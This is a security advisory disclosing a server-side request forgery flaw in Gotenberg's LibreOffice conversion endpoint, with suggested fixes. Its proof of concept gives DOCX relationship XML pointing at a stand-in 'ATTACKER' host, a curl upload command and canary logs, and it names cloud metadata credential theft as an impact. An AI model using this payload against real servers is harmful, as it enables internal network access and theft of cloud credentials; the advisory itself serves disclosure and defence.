# [H] Gotenberg has a Server-Side Request Forgery (SSRF) Issue

## Summary
Severity: High
Advisory: GHSA-rm4c-xj6x-49mw
CVE: CVE-2026-42591
CWE: CWE-918
Ecosystem: Go
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:N (CVSS_V3)
Published: 2026-05-07
Source: https://github.com/advisories/GHSA-rm4c-xj6x-49mw
Type: github-advisory

## Affected
- Go: `github.com/gotenberg/gotenberg/v8` — affected >=0

## Details
### Summary

The SSRF hardening shipped in v8.31.0 only covers outbound URLs that Gotenberg's Go code handles — Chromium asset fetches, webhook delivery, and download-from. The LibreOffice conversion endpoint (`/forms/libreoffice/convert`) passes uploaded documents directly to LibreOffice without inspecting their content. LibreOffice then fetches any embedded external URLs on its own, completely bypassing the SSRF filters.

This was verified on v8.31.0 (latest at time of writing) with a crafted DOCX and got 3 outbound HTTP requests from LibreOffice to the canary server used for testing.

### Details

When a file is uploaded to `/forms/libreoffice/convert`, the route in `pkg/modules/libreoffice/routes.go` reads form parameters and passes the input file directly to `libreOffice.Pdf()`:

```go
err = libreOffice.Pdf(ctx, ctx.Log(), inputPath, outputPaths[i], options)
```

There's no content inspection happening before the file reaches LibreOffice. The SSRF protection in v8.31.0 (`pkg/gotenberg/outbound.go`) wraps Go's `http.Client` with a custom dialer that resolves URLs and rejects non-public IPs — but LibreOffice is a separate process that makes its own HTTP connections via libcurl. The Go-level dial hooks can't intercept that.

OOXML formats like DOCX can embed external image references using `TargetMode="External"` in relationship files. LibreOffice fetches those URLs during PDF conversion.

**Suggested fix:** Run LibreOffice with `unshare --net` to drop all network access from the subprocess — no network namespace means no outbound requests regardless of file format. As defense in depth, scan uploaded OOXML files (which are ZIPs) for `_rels/*.rels` entries with `TargetMode="External"` and validate/strip those URLs before passing the file to LibreOffice.

### PoC

Build a minimal DOCX with an external image reference. DOCX files are ZIP archives, so you can construct one by hand.

**`word/_rels/document.xml.rels`:**

```xml
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
  <Relationship Id="rId10"
    Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image"
    Target="http://ATTACKER:9877/ssrf"
    TargetMode="External"/>
</Relationships>
```

**`word/document.xml`** (references the external image via `r:link`):

```xml
<w:drawing>
  <wp:inline distT="0" distB="0" distL="0" distR="0">
    <wp:extent cx="914400" cy="914400"/>
    <wp:docPr id="1" name="Picture 1"/>
    <a:graphic>
      <a:graphicData uri="http://schemas.openxmlformats.org/drawingml/2006/picture">
        <pic:pic>
          <pic:nvPicPr>
            <pic:cNvPr id="1" name="ssrf.png"/>
            <pic:cNvPicPr/>
          </pic:nvPicPr>
          <pic:blipFill>
            <a:blip r:link="rId10"/>
            <a:stretch><a:fillRect/></a:stretch>
          </pic:blipFill>
          <pic:spPr>
            <a:xfrm>
              <a:off x="0" y="0"/>
              <a:ext cx="914400" cy="914400"/>
            </a:xfrm>
            <a:prstGeom prst="rect"><a:avLst/></a:prstGeom>
          </pic:spPr>
        </pic:pic>
      </a:graphicData>
    </a:graphic>
  </wp:inline>
</w:drawing>
```

Pack into a valid DOCX zip and send:

```sh
curl -s -o output.pdf \
  http://TARGET:3000/forms/libreoffice/convert \
  --form files=@ssrf_test.docx
```

Canary server immediately shows LibreOffice reaching out:

```
OPTIONS /GOTENBERG_SSRF HTTP/1.1
Host: host.docker.internal:9877
User-Agent: LibreOffice 26.2.2.2 denylistedbackend/8.19.0 OpenSSL/3.5.5
Accept: */*
Accept-Encoding: deflate, gzip, br, zstd

GET /GOTENBERG_SSRF HTTP/1.1
Host: host.docker.internal:9877
User-Agent: LibreOffice 26.2.2.2 denylistedbackend/8.19.0 OpenSSL/3.5.5
Accept: */*
Accept-Encoding: deflate, gzip, br, zstd
```

3 requests total (OPTIONS + 2x GET) from a single conversion. Tested against `gotenberg/gotenberg:8.31.0`.

### Impact

LibreOffice makes full GET requests, so response data can be exfiltrated through the generated PDF:

- Hit internal services — localhost, 10.x, 192.168.x, whatever the container can reach
- Grab cloud metadata at `http://169.254.169.254/` (AWS/GCP/Azure IAM creds)
- Port scan the internal network via response timing
- The v8.31.0 SSRF hardening doesn't help here at all — it only covers Go HTTP calls, not LibreOffice's own connections

Anything LibreOffice opens that can carry external refs is affected: `.docx`, `.docm`, `.xlsx`, `.xlsm`, `.pptx`, `.pptm`, `.odt`, `.ods`, `.odp`, `.rtf`.

## References
- https://github.com/gotenberg/gotenberg/security/advisories/GHSA-rm4c-xj6x-49mw
- https://nvd.nist.gov/vuln/detail/CVE-2026-42591
- https://github.com/gotenberg/gotenberg
